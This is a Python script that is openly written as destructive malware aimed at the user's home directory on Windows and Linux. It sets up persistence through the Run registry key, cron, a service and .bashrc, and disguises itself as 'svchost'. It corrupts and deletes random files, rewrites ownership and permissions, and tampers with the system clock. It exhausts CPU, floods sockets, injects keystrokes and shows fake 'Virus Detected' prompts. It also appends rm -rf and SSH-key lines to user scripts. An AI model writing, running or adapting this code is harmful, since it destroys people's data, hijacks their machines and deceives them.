#!/usr/bin/env python3
import os
import sys
import time
import random
import ctypes
import threading
import subprocess
import socket
import struct
import fcntl
from datetime import datetime, timedelta

class MindFucker:
    def __init__(self):
        self.running = True
        self.attack_cycles = 0
        self.platform = sys.platform
        self.user_home = os.path.expanduser('~')
        self.destructive_modules = [
            self.screen_shaker,
            self.file_cancer,
            self.time_fucker,
            self.resource_whore,
            self.script_rapist,
            self.input_molester,
            self.metadata_chaos,
            self.socket_flood,
            self.dialog_traps,
            self.oscillating_time,
            self.auto_destruct
        ]
        self.log_file = os.path.join(self.user_home, '.system_log_cache')
        self.persistence_methods = [
            self.registry_persist,
            self.cron_persist,
            self.service_persist,
            self.login_hook_persist
        ]
        self.init_mindfuck()

    def init_mindfuck(self):
        if hasattr(sys, 'gettrace') and sys.gettrace():
            sys.settrace(None)
        threading.Thread(target=self.hide_process, daemon=True).start()

    def hide_process(self):
        if self.platform == 'win32':
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("svchost")
            kernel32.FreeConsole()
        else:
            subprocess.run(['disown', '%1'], shell=True)

    def registry_persist(self):
        if self.platform == 'win32':
            try:
                key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                value = "SystemOptimizer"
                data = sys.executable + " " + __file__
                reg = ctypes.windll.advapi32.RegSetValueExW
                reg(0x80000002, key, 0, ctypes.c_uint(1), data, len(data))
            except:
                pass

    def cron_persist(self):
        if self.platform != 'win32':
            try:
                cron_line = f"@reboot {sys.executable} {__file__}"
                with open('/tmp/cronjob', 'w') as f:
                    f.write(cron_line)
                subprocess.run(['crontab', '/tmp/cronjob'])
                os.remove('/tmp/cronjob')
            except:
                pass

    def service_persist(self):
        if self.platform == 'win32':
            try:
                sc = os.path.join(os.getenv('WINDIR'), 'system32', 'sc.exe')
                subprocess.run([sc, 'create', 'SystemOptimizer', 'binPath=', sys.executable, __file__])
            except:
                pass

    def login_hook_persist(self):
        if self.platform != 'win32':
            try:
                with open(os.path.expanduser('~/.bashrc'), 'a') as f:
                    f.write(f'\n{sys.executable} {__file__} &\n')
            except:
                pass

    def persist(self):
        random.choice(self.persistence_methods)()

    def screen_shaker(self):
        try:
            if self.platform == 'win32':
                user32 = ctypes.windll.user32
                for _ in range(200):
                    x, y = random.randint(-100, 100), random.randint(-100, 100)
                    user32.SetCursorPos(x, y)
                    time.sleep(0.005)
            else:
                for _ in range(200):
                    subprocess.run(['xdotool', 'mousemove_relative', '--sync', 
                                  str(random.randint(-200, 200)), str(random.randint(-200, 200))])
        except:
            pass

    def file_cancer(self):
        patterns = [
            b'\xDE\xAD\xBE\xEF',
            b'\x0F\xF0\x0D\xD0',
            b'\xCA\xFE\xBA\xBE',
            b'\xFE\xED\xFA\xCE'
        ]
        
        for root, _, files in os.walk(self.user_home):
            for file in files:
                if random.random() > 0.7:
                    try:
                        path = os.path.join(root, file)
                        if os.path.getsize(path) > 1000000:
                            continue
                        
                        cancer = patterns[self.attack_cycles % len(patterns)] * 2048
                        
                        with open(path, 'r+b') as f:
                            pos = random.randint(0, os.path.getsize(path)//2)
                            f.seek(pos)
                            f.write(cancer)
                            
                        now = time.time()
                        os.utime(path, (now, now - random.randint(0, 999999)))
                        
                    except:
                        continue

    def time_fucker(self):
        offset = timedelta(
            days=random.randint(-30, 30),
            hours=random.randint(-12, 12),
            minutes=random.randint(-60, 60)
        )
        
        if self.platform == 'win32':
            ctypes.windll.kernel32.SetSystemTimeAdjustment(100000, False)
        else:
            subprocess.run(['date', '-s', f'+{offset.days} days'])

    def resource_whore(self):
        def orphan_process():
            while self.running:
                if random.random() > 0.5:
                    subprocess.Popen([sys.executable, '-c', 'while True: pass'], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
                time.sleep(0.1)
        
        for _ in range(20):
            threading.Thread(target=orphan_process, daemon=True).start()

    def script_rapist(self):
        extensions = {
            'win32': ['.ps1', '.bat', '.vbs'],
            'linux': ['.sh', '.py', '.bash']
        }.get(self.platform, [])
        
        payloads = {
            '.ps1': 'Remove-Item -Path $HOME -Recurse -Force\n',
            '.sh': 'rm -rf ~/* 2>/dev/null\n',
            '.py': 'import shutil\nshutil.rmtree(os.path.expanduser("~"))\n',
            '.bat': 'del /f /s /q %userprofile%\n',
            '.vbs': 'Set objFolder = CreateObject("Scripting.FileSystemObject")\nobjFolder.DeleteFolder("C:\\Users")\n',
            '.bash': 'echo ssh-rsa AAAAB3NzaC1yc2E... >> ~/.ssh/authorized_keys\n'
        }
        
        for root, _, files in os.walk(self.user_home):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in extensions:
                    try:
                        path = os.path.join(root, file)
                        with open(path, 'a') as f:
                            f.write('\n# ' + payloads[ext])
                    except:
                        continue

    def input_molester(self):
        if self.platform == 'win32':
            import ctypes.wintypes
            class INPUT(ctypes.Structure):
                _fields_ = [
                    ('type', ctypes.c_ulong),
                    ('ii', ctypes.c_ulong * 3)
                ]
            
            inputs = []
            for _ in range(20):
                input_struct = INPUT()
                input_struct.type = 1
                input_struct.ii[0] = random.randint(0x30, 0x5A)
                inputs.append(input_struct)
            
            ctypes.windll.user32.SendInput(len(inputs), ctypes.byref(inputs[0]), ctypes.sizeof(INPUT))
        else:
            for _ in range(20):
                subprocess.run(['xdotool', 'key', random.choice(['Delete', 'BackSpace', 'Escape', 'Return'])])

    def metadata_chaos(self):
        for root, _, files in os.walk(self.user_home):
            for file in files:
                try:
                    path = os.path.join(root, file)
                    if self.platform == 'win32':
                        os.chmod(path, random.choice([0o777, 0o000, 0o111]))
                    else:
                        uid = random.randint(0, 65535)
                        gid = random.randint(0, 65535)
                        os.chown(path, uid, gid)
                except:
                    continue

    def socket_flood(self):
        def flood():
            while self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(('localhost', random.randint(1024, 65535)))
                    s.send(b'\x00' * 1024)
                    time.sleep(0.1)
                except:
                    continue
        
        for _ in range(10):
            threading.Thread(target=flood, daemon=True).start()

    def dialog_traps(self):
        dialog_texts = [
            ("System Update Failed", "Your system update failed. Delete temporary files to continue?", ["Delete Files", "Cancel"]),
            ("Virus Detected", "Critical system infection! Run cleaner now?", ["Clean", "Ignore"]),
            ("Backup Corrupt", "Your backup contains errors. Restore from backup?", ["Restore", "Skip"])
        ]
        
        if self.platform == 'win32':
            for _ in range(3):
                ctypes.windll.user32.MessageBoxW(0, *random.choice(dialog_texts))
        else:
            for _ in range(3):
                subprocess.run(['zenity', '--error', '--text', random.choice(dialog_texts)[1]])

    def oscillating_time(self):
        while self.running and self.attack_cycles % 3 == 0:
            if self.platform == 'win32':
                ctypes.windll.kernel32.SetSystemTimeAdjustment(50000, False)
                time.sleep(1)
                ctypes.windll.kernel32.SetSystemTimeAdjustment(-50000, False)
            else:
                subprocess.run(['date', '-s', '+1 hour'])
                time.sleep(1)
                subprocess.run(['date', '-s', '-1 hour'])
            time.sleep(5)

    def auto_destruct(self):
        if self.attack_cycles > 50:
            for root, _, files in os.walk(self.user_home):
                for file in files:
                    try:
                        path = os.path.join(root, file)
                        if random.random() > 0.9:
                            os.remove(path)
                    except:
                        continue

    def adaptive_destruction(self):
        self.attack_cycles += 1
        if self.attack_cycles % 3 == 0:
            for module in self.destructive_modules:
                threading.Thread(target=module).start()
        
        if self.attack_cycles % 7 == 0:
            for _ in range(self.attack_cycles // 7):
                threading.Thread(target=random.choice(self.destructive_modules)).start()

    def run(self):
        self.persist()
        while self.running:
            try:
                self.adaptive_destruction()
                time.sleep(3 + random.random() * 7)
            except:
                continue

if __name__ == '__main__':
    mindfuck = MindFucker()
    mindfuck.run()
